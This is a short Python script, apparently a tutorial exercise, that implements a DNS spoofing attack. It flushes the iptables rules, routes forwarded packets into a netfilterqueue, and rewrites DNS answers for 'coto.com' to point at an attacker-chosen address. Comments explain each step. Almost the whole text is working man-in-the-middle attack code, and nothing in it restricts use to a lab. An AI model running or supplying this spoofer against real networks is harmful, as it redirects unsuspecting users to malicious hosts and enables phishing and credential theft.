#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess

#Flush IP tables and create QUEUE
subprocess.call("iptables --flush", shell=True)
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)


def proceso_paquete(paquete):

    paquete_scapy = scapy.IP(paquete.get_payload())#We convert it in a scapy packet, get_payload() is a netfilterqueue method
    if paquete_scapy.haslayer(scapy.DNSRR):#DNSRR is for response DNSRQ is for request, DNS shows all about DNS
        qname = paquete_scapy[scapy.DNSQR].qname
        if "coto.com" in qname:
            print("[+]Poisoning the target: "+ qname)
            answer = scapy.DNSRR(rrname="www.coto.com", rdata="<The IP to redirect to>")
            paquete_scapy[scapy.DNS].an = answer #We determ the modify values, and we declare them as
            #answer (an), you can see it with the method show() in scapy
            paquete_scapy[scapy.DNS].ancount = 1 # ancount is the amount of segments in the anwer, because we only leave one we have to modify the header
            """Now, because we modify the original packet many of the characteristics described in the headers are not accurate.
            To avoid problems with the packets we must modify some of the headers of the protocols involved.
            Lucky for us the module scapy ,if we erase the value of the headers, recalculates the value of the 
            headers acording to the changes that we made"""
            
            del paquete_scapy[scapy.IP].len 
            del paquete_scapy[scapy.IP].chksum 
            del paquete_scapy[scapy.UDP].len
            del paquete_scapy[scapy.UDP].chksum

            paquete.set_payload(str(paquete_scapy)) #Now we convert the scapy packet to be the new payload 
            #of the netfilterqueue, which will release it to the destination with our modification 

    paquete.accept() #accept() releases the packets in the queue
    #paquete.drop() will, as it says, drop the packet. 


queue = netfilterqueue.NetfilterQueue()
#With the method bind() we join the queue object we just created with the queue we
#created by using the call() method of the subprocess library. And for every packet that
#gets in the queue it will initiate a funtion (proceso_paquete in this case)
queue.bind(0, proceso_paquete)

#Then we make it run with RUN :)
queue.run()
